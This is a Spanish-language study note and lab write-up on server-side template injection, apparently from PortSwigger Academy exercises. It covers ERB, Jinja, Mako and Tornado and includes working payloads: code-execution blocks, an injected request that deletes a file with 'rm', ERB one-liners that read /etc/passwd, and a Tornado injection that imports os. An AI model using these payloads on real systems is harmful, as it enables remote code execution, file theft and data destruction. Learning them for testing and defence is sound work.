
# Server-side template injection (SSTI)

Las paginas html antes eran estaticas pero con la aparicion de frameworks como ruby on rails y librerias como reactjs. Las paginas de internet
se hicieron mas dinamicas.

> HTML tags provide static web pages only but ERB tags give us dynamic information in that HTML template.

## Template Example

```
<h1> Event Details for <%= event.name %> </h1> 
```

Un ejemplo es fb para todos los perfires renderiza los amigos de cada cuenta y existen 2 el client side rendering y server side rendering.

> A menos que ya conozca el motor de plantillas de adentro hacia afuera, leer su documentación suele ser el primer lugar para comenzar.
> Aprender la sintaxis básica es obviamente importante, junto con las funciones clave y el manejo de variables. Incluso algo tan simple como aprender a incrustar bloques de código nativo en la plantilla a veces puede conducir rápidamente a un exploit. Por ejemplo, una vez que sepa que se está utilizando el motor de plantillas Mako basado en Python, lograr la ejecución remota de código podría ser tan simple como:

***Palabra clave***: motores de plantillas comunes

```
<%
                import os
                x=os.popen('id').read()
                %>
                ${x}
                
```

# Tipos de motores de plantillas (aunque hay muchos esto solo es un ejemplo)

## ERB 

ERB es un motor de plantillas. Un motor de plantillas le permite mezclar HTML y Ruby para que pueda generar páginas web utilizando datos de su base de datos. ERB es el motor predeterminado de Rails para renderizar vistas. Nota: Rails usa una implementación llamada erubi en lugar de la clase ERB de la biblioteca estándar de Ruby.

Sintaxis example

```
<%= @user.name%>
```


## JINJA

Jinja2 is a modern day templating language for Python developers. It was made after Django's template. It is used to create HTML, XML or other markup formats that are returned to the user via an HTTP request.

Sintaxis example

```
{{user.hit_that_like}}

```

# SSTI metodologia

1. Busca reflexion de parametros ingresados por el usuario
2. enumera de que template engine se trata haciendo que el payload sea evaluado
3. explitalo rce o solo sacar informacion.

> https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

### Detect - Plaintext context( dentro de hacktricks) 

```

{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}

```

# Basic server-side template injection

Para este laboratorio primero nos damos cuenta que al probar un producto nos manda en una peticion GET que no hay stock
despues si en esa misma peticion ponemos algo cualquier cosa lo renderiza!


```
GET /?message=<%25%3d+system("rm+morale.txt")+%25> HTTP/1.1
Host: 0a9a000604434cc5c04469150063005a.web-security-academy.net
Cookie: session=9w4H3Kb9L9iMwIiijw2slP6Pt6LKHJQ0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0a9a000604434cc5c04469150063005a.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: es-419,es;q=0.9
Connection: close



```

Se manda la peticion al intruder y se selecciona donde estara el payload despues no dirijomos a la pestaña
Payloads -> Payloads Options y ahi pegamos las " Plaintext context" para probar a que tipo de template engine
nos enfrentamos. Tambien nos dirigimos a Options-> Reg Extract -> add y seleccionamos el div donde se refleja 
nuestro output en nuesta respuesta de la pericion GET. Inciamos el ataque y vemos que la sintaxis de ERB de ruby es
la que renderiza el 49 (7*7).

Finalmente podemos ejecutar comandos con:

```
<%= system("whoami") %> #Execute code
<%= Dir.entries('/') %> #List folder
<%= File.open('/etc/passwd').read %> #Read file

```

Borrando el archivo ( recuerda usar URL encode)


# Basic server-side template injection (code context)

Par  este  laboratorio se tiene que pensar de la siguiente mannera. Primero se va a la funcionalidad de "Preferred name"
dentro de esta se manda una parte "user.name"  que va variando segun el selelct.

1. Primero reconocemos que ahi puede haber un ssti.
2. Intentamos hacer fallar a la aplicacion para que nos de informacion user.noexist

```
"/usr/local/lib/python2.7/dist-packages/tornado/template.py"
```
3. Indentificamos que el template engine es tornado entonces vamos a trabajar con esa sintaxis.

4. Usamos la sintaxis de tornado

Cerramos el string con }} despues importamos un os y un system y el comando en la funcionalidad.


```
blog-post-author-display=user.first_name}}{% import os %}{{os.system('pwd')}}&csrf=3zrIydtzhGhCcccm3tjhQhR22U7nxYqs

```

Por ultimo mandar la solicitud desde la pagina de la funcionalidad y recargar la otra finalmente borrar el archivo y asi se resuelve.
























